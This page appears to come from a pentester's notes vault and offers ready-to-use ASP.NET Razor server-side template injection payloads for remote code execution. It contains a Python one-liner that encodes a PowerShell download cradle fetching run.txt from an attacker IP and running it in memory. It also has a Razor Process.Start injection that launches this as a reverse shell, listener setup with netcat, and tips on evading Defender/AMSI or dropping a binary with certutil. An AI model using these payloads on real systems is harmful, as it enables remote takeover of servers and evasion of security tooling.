---
title: ASP Razor SSTI
draft: false
tags:
  - payloads
  - ssti
  - dotnet
  - web
  - rce
---
 
Ready-to-use payloads for achieving RCE through a **Server-Side Template Injection in ASP.NET Razor**. Razor templates are C#, so once input reaches the renderer (`@(...)` is evaluated) you can call `System.Diagnostics.Process.Start` and run arbitrary commands. Confirm the injection first (`@(7*7)` should render `49`); the full detection + exploitation methodology lives in [[Server-Side Template Injection (SSTI) in ASP.NET Razor]].

Encoded payload:
```bash
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.203/run.txt\\') | IEX'.encode('utf-16le')).decode())"

KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAzAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA
```

> [!Note]
> The base64 above is a PowerShell **download cradle**: it pulls `run.txt` from the attacker web server and pipes it to `IEX` (in-memory execution, nothing touched on disk). Serve the script and stand up the listener before triggering the payload:
> ```bash
> $ python3 -m http.server 80        # serves run.txt from the current dir
> $ nc -lvnp 4444                     # matches the listener inside run.txt
> ```
> Remember `-enc` expects a **UTF-16LE** base64 string, which is why the encoder above uses `utf-16le`. Change the IP/port to your own before generating.

Lets try injecting a reverse shell
```
@System.Diagnostics.Process.Start("cmd.exe","/c powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAzAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA");
```

> [!Tip]
> If the encoded PowerShell one-liner is caught by Defender/AMSI, obfuscate it (see [[Obfuscation]] and [[Bypassing AMSI With Reflection in PowerShell]]) or fall back to a binary dropper (`curl`/`certutil` the `shell.exe` to `C:\Windows\Tasks\` and execute it) — full droppers are in [[Server-Side Template Injection (SSTI) in ASP.NET Razor]]. Generate the actual reverse-shell content with the recipes in [[Shells]] / [[Payloads]].

### Related notes
- [[Server-Side Template Injection (SSTI) in ASP.NET Razor]] — detection + full exploitation workflow
- [[Shells]] — reverse-shell one-liners and stabilisation
- [[Payloads]] — generating stagers with msfvenom
- [[Obfuscation]] — evading AV/AMSI when the encoded command is flagged
- [[Command Injection]] — sibling RCE class (same detect-by-evaluation approach)
